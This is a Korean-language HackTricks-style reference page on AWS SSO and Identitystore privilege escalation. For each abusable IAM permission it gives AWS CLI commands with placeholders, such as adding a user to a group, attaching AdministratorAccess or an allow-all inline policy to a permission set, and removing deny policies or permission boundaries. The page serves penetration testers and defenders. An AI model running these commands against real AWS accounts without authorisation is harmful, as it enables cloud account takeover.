# AWS - SSO 및 Identitystore 권한 상승

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 해킹 기법을 공유하세요.

</details>

## AWS Identity Center / AWS SSO

AWS Identity Center / AWS SSO에 대한 자세한 정보는 다음을 확인하세요:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
**기본적으로**, **관리 계정**의 권한을 가진 **사용자**만 IAM Identity Center에 액세스하고 제어할 수 있습니다.\
다른 계정의 사용자는 **위임된 관리자**인 경우에만 허용할 수 있습니다.\
[자세한 내용은 문서를 확인하세요.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)
{% endhint %}

### ~~비밀번호 재설정~~

이와 같은 경우 권한 상승을 위한 쉬운 방법은 사용자 비밀번호를 재설정할 수 있는 권한을 가지는 것입니다. 불행히도 사용자의 이메일에 비밀번호 재설정을 위한 이메일을 보낼 수 있는 방법만 있으므로 사용자의 이메일에 액세스해야 합니다.

### `identitystore:CreateGroupMembership`

이 권한을 사용하면 사용자를 그룹에 설정하여 그룹이 가진 모든 권한을 상속받을 수 있습니다.

{% code overflow="wrap" %}
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

이 권한을 가진 공격자는 자신이 통제하는 사용자에게 부여된 권한 세트에 추가 권한을 부여할 수 있습니다.

{% code overflow="wrap" %}
```bash
# Set an inline policy with admin privileges
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Content of /tmp/policy.yaml
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Statement1",
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

이 권한을 가진 공격자는 자신이 통제하는 사용자에게 부여된 권한 세트에 추가 권한을 부여할 수 있습니다.

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

이 권한을 가진 공격자는 자신이 통제하는 사용자에게 부여된 허가 집합에 추가 권한을 부여할 수 있습니다.

{% hint style="warning" %}
이 경우 이러한 권한을 악용하려면 영향을 받을 모든 계정에 있는 **고객 관리 정책의 이름을 알아야 합니다**.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:CreateAccountAssignment`

이 권한을 가진 공격자는 계정에 사용자에게 권한 집합을 부여할 수 있습니다.

{% code overflow="wrap" %}
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
### `sso:GetRoleCredentials`

사용자에게 할당된 역할 이름에 대한 STS 단기 자격증명을 반환합니다.

{% code overflow="wrap" %}
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
{% endcode %}

그러나, 어떻게 얻을 수 있는지 잘 모르는 액세스 토큰이 필요합니다 (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

이 권한을 가진 공격자는 지정된 권한 집합에서 AWS 관리 정책과의 연결을 제거할 수 있습니다. **관리 정책 (거부 정책)를 분리함으로써** 더 많은 권한을 부여할 수 있습니다.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

이 권한을 가진 공격자는 지정된 권한 집합에서 고객 관리 정책과의 연결을 제거할 수 있습니다. **관리 정책 (거부 정책)를 분리**함으로써 더 많은 권한을 부여할 수 있습니다.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed-policy-reference <value>
```
### `sso:DeleteInlinePolicyFromPermissionSet`

이 권한을 가진 공격자는 허가 집합에서 인라인 정책의 권한을 제거할 수 있습니다. 인라인 정책을 분리함으로써 더 많은 권한을 부여할 수 있습니다 (거부 정책).
```bash
aws sso-admin delete-inline-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN>
```
### `sso:DeletePermissionBoundaryFromPermissionSet`

이 권한을 가진 공격자는 권한 세트에서 Permission Boundary를 제거할 수 있습니다. Permission Boundary에서 제공된 제한을 제거함으로써 권한 세트에 더 많은 권한을 부여할 수 있습니다.

{% code overflow="wrap" %}
```bash
aws sso-admin   delete-permissions-boundary-from-permission-set --instance-arn <value> --permission-set-arn <value>
```
{% endcode %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
